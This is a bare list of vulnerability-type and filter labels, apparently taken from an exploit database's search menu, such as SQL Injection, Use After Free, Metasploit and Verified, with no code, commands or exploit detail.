Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search


